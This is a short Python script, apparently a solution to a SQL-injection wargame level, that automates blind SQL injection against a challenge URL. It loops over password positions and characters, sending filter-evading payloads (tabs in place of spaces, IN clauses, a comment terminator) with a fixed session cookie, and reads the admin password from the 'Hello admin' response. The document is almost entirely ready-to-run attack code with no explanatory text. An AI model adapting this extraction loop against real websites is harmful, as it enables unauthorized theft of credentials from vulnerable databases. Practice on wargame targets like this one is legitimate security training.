import urllib.request
from urllib.parse import quote

key = ""
for i in range(1, 9):
    for j in range(48, 127):
        url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
        data = '1||id%09IN%09("admin")%26%26mid(pw,1,{})%09IN%09("{}")%23'.format(str(i), key + chr(j))
        print(data)
        # no=1||id%09IN%09("admin")%26%26MID(pw,1,1)%09IN%09("7")%09--%09-
        # data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
        re.add_header("Cookie", "PHPSESSID=lu2qch32sh6s8s57djgjra3hs3")
        res = urllib.request.urlopen(re) 
        if str(res.read()).find("Hello admin") != -1:
            key += chr(j).lower()
            print(key)
            break
print(key)